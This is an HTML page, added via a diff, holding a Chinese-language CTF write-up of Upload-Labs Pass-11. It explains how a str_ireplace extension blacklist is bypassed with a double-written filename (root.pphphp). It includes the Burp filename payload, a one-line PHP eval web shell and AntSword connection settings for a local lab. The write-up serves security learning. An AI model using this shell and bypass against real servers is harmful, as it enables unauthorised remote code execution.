@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【Upload-Labs】Pass-11 双写绕过 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【Upload-Labs】Pass-11 双写绕过 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.11.02 | <strong>分类：</strong>CTF | <strong>标签：</strong>Upload-Labs, Web, 文件上传, 双写绕过, WebShell</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>Upload-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - 文件上传</li>
+        <li><strong>题目名称：</strong>Pass-11 (服务端黑名单替换 - 双写绕过)</li>
+        <li><strong>提示：</strong>服务端不再使用黑名单数组比对，而是使用字符串替换函数过滤危险后缀。</li>
+    </ul>
+
+    <h2>2. 核心原理与前置分析</h2>
+    <p>本关卡的核心漏洞在于<strong>后端过滤函数 <code>str_ireplace()</code> 的执行逻辑</strong>。</p>
+    <p>源码中使用了 <code>str_ireplace($deny_ext, "", $file_name)</code> 将黑名单词汇（如 <code>php</code>）从文件名中删除。然而，该函数是从左向右扫描字符串，一旦匹配到连续的目标字符就将其删除，然后继续向后扫描，且不会造成重叠匹配。</p>
+    <p>因此，攻击者可以通过“双写”技巧，构造形如 <code>root.pphphp</code> 的文件名。代码找到中间的 <code>php</code> 并删除后，剩余的首尾部分拼接起来，恰好还原成了合法的 <code>root.php</code>，从而实现绕过。</p>
+
+    <h2>3. 工具配置与操作步骤</h2>
+    
+    <h3>工具配置：Burp Suite、浏览器开发者工具 与 中国蚁剑</h3>
+    <ul>
+        <li><strong>中国蚁剑：</strong>URL 地址：<code>http://127.0.0.1:8081/upload/root.php</code>；连接密码：<code>cmd</code>；编码：UTF-8。</li>
+    </ul>
+
+    <h3>操作步骤与解析：</h3>
+    
+    <p><strong>第一步：抓包构造双写 Payload</strong></p>
+    <p>开启 Burp Suite 拦截上传请求，将本地文件 <code>shell.php</code> 的请求字段修改为：</p>
+    <pre>filename="root.pphphp"</pre>
+    <p>点击 Forward 放行请求。</p>
+
+    <p><strong>第二步：发现过程与逻辑推演（关键复盘）</strong></p>
+    <p>上传完成后，直接访问 <code>root.</code> 路径时，页面回显了完整的 PHP 源码（<code>&lt;?php @eval($_POST['cmd']); ?&gt;</code>），且蚁剑连接失败。这引发了对 <code>str_ireplace</code> 执行逻辑的深度质疑。</p>
+    <p>起初的误判：以为 <code>str_ireplace</code> 会把 <code>root.php</code> 里的 <code>php</code> 再次删除，导致文件变成 <code>root.</code>。</p>
+    <p><strong>真相的发掘：</strong>通过重新审查前端 F12 开发者工具，搜索 <code>/upload</code>，发现真实的回显路径为 <code>&lt;img src="../upload/root.php"&gt;</code>。结合函数特性推演：<code>root.pphphp</code> 在扫描时，中间的 <code>php</code> 被删除，剩下的 <code>root.p</code> 和 <code>hp</code> 拼合，刚好形成了 <code>root.php</code>。之前的报错是因为访问 URL 时遗漏了 <code>php</code> 后缀。</p>
+
+    <p><strong>第三步：验证与连接</strong></p>
+    <p>访问真实的纯净路径 <code>http://127.0.0.1:8081/upload/root.php</code>，页面呈现纯白状态。使用蚁剑填入该 URL 和密码 <code>cmd</code>，测试连接成功。随后清理 <code>root.php</code>。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>对替换函数的误解：</strong>在处理字符串替换逻辑时，容易理所当然地认为过滤是“全局彻底”的。实际上，非重叠的单次替换（从左到右扫描）正是双写绕过的生存土壤。</li>
+        <li><strong>URL 路径的完整性：</strong>在构造 WebShell 的访问路径时，必须确保后缀的完整性。代码回显源码往往是因为后缀不完整（如只有 <code>root.</code>）导致 Apache 未能触发 PHP 解析器。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>双写绕过</strong>：利用后端替换函数的单向、非重叠匹配特性，通过嵌套构造危险后缀，使得替换后的字符串重新组合成合法的可执行后缀。</li>
+        <li><strong>基于回显的源码推理</strong>：在遇到回显异常时，利用 F12 审查真实路径并结合代码逻辑反推过滤机制，是黑盒测试中的核心能力。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
